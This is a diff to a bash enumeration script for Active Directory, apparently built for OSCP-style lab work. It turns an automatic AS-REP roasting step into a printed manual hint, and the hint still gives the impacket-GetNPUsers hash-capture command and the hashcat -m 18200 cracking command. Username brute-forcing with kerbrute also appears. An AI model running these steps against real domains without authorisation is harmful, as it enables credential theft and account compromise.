@@ -79,7 +79,9 @@ cmd "nmap -p389,636,3268,3269 --script ldap-search,ldap-rootdse,ldap-novell-getp
 nmap -p389,636,3268,3269 \
     --script 'ldap-search,ldap-rootdse' \
     -Pn "$TARGET" \
-    -oN "$NMAP_LDAP" 2>&1 | tee "$NMAP_LDAP" || true
+    -oN "$NMAP_LDAP" 2>&1 | tee "$NMAP_LDAP" || {
+    warn "nmap (LDAP) failed — output may be incomplete. Check ${NMAP_LDAP} for details."
+} # IMP-7 applied
 echo ""
 
 # ===========================================================================
@@ -369,7 +371,9 @@ else
             --dc "$TARGET" \
             "$WL_KERB" \
             -o "$KERB_OUT" \
-            2>&1 | tee "${KERB_OUT}.log" || true
+            2>&1 | tee "${KERB_OUT}.log" || {
+            warn "kerbrute failed — output may be incomplete. Check ${KERB_OUT}.log for details."
+        } # IMP-7 applied
 
         # Merge any confirmed kerbrute users into the master ldap_users.txt
         if [[ -f "$KERB_OUT" ]]; then
@@ -386,46 +390,18 @@ else
             if [[ "$VALID_COUNT" -gt 0 ]]; then
                 ok "${RED}kerbrute: ${VALID_COUNT} VALID USERNAME(S) confirmed!${NC} → ${VALID_USERS}"
 
-                # ============================================================
-                # Step C — THE KILL: AS-REP Roast immediately on valid users
-                # ============================================================
-                echo ""
-                echo -e "  ${RED}${BOLD}╔══════════════════════════════════════════════════════════╗${NC}"
-                echo -e "  ${RED}${BOLD}║  KILL CHAIN: RUNNING AS-REP ROAST — CAPTURING HASHES    ║${NC}"
-                echo -e "  ${RED}${BOLD}╚══════════════════════════════════════════════════════════╝${NC}"
-                echo ""
+                # OSCP+ COMPLIANT — manual only
+                hint "AS-REP Roasting — run manually after enumeration:
+    impacket-GetNPUsers ${DOMAIN}/ \\
+        -usersfile ${VALID_USERS} \\
+        -no-pass \\
+        -dc-ip ${TARGET} \\
+        -format hashcat \\
+        -outputfile ${LDAP_DIR}/asrep_hashes.txt
 
-                HASH_OUT="${LDAP_DIR}/asreproast.hashes"
-
-                if command -v impacket-GetNPUsers &>/dev/null; then
-                    cmd "impacket-GetNPUsers ${DOMAIN}/ -usersfile ${VALID_USERS} -no-pass -dc-ip ${TARGET} -format hashcat"
-                    impacket-GetNPUsers "${DOMAIN}/" \
-                        -usersfile "$VALID_USERS" \
-                        -no-pass \
-                        -dc-ip "$TARGET" \
-                        -format hashcat \
-                        2>&1 | tee "$HASH_OUT" || true
-
-                    # Filter out non-hash lines (info/error output) so the file
-                    # contains only raw $krb5asrep$ entries
-                    grep '^\$krb5asrep\$' "$HASH_OUT" > "${HASH_OUT}.clean" 2>/dev/null || true
-                    if [[ -s "${HASH_OUT}.clean" ]]; then
-                        mv "${HASH_OUT}.clean" "$HASH_OUT"
-                        HASH_COUNT=$(wc -l < "$HASH_OUT")
-                        echo ""
-                        echo -e "  ${RED}${BOLD}[!!!] ${HASH_COUNT} AS-REP HASH(ES) CAPTURED → ${HASH_OUT}${NC}"
-                        echo -e "  ${RED}${BOLD}[!!!] CRACK WITH:${NC}"
-                        echo -e "  ${WHITE}  hashcat -m 18200 ${HASH_OUT} /usr/share/wordlists/rockyou.txt \\${NC}"
-                        echo -e "  ${WHITE}      -r /usr/share/john/rules/best64.rule${NC}"
-                        echo ""
-                    else
-                        rm -f "${HASH_OUT}.clean"
-                        info "GetNPUsers ran — no AS-REP hashes returned (all accounts require pre-auth)"
-                    fi
-                else
-                    warn "impacket-GetNPUsers not found — skipping AS-REP Roast."
-                    hint "Install: pip3 install impacket"
-                fi
+    # Crack captured hashes:
+    hashcat -m 18200 ${LDAP_DIR}/asrep_hashes.txt /usr/share/wordlists/rockyou.txt \\
+        -r /usr/share/john/rules/best64.rule"
             else
                 info "kerbrute: no usernames confirmed valid (pre-auth may be required for all)"
             fi
